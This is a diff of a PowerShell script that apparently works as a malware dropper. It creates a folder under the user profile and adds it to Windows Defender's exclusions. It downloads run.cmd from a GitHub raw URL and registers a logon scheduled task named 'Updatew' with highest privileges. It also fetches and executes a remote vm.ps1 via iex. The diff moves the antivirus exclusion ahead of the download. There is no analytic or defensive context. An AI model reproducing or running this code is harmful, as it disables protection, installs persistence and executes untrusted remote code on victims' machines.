@@ -1,16 +1,18 @@
 $dir = "$env:userprofile\150F4013"
 New-Item -ItemType Directory -Path $dir
 
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$dir\run.cmd"
+$temp = "$dir\temp"
+New-Item -ItemType Directory -Path $temp
+Add-MpPreference -ExclusionPath $dir
+
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$temp\run.cmd"
 schtasks.exe /Create /SC ONLOGON /TN Updatew /TR "$dir\run.cmd" /RL HIGHEST /F
+
 
 
 iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/vm.ps1" -useb)
 
 
-$temp = "$dir\temp"
-New-Item -ItemType Directory -Path $temp
-Add-MpPreference -ExclusionPath $dir
 
 
 
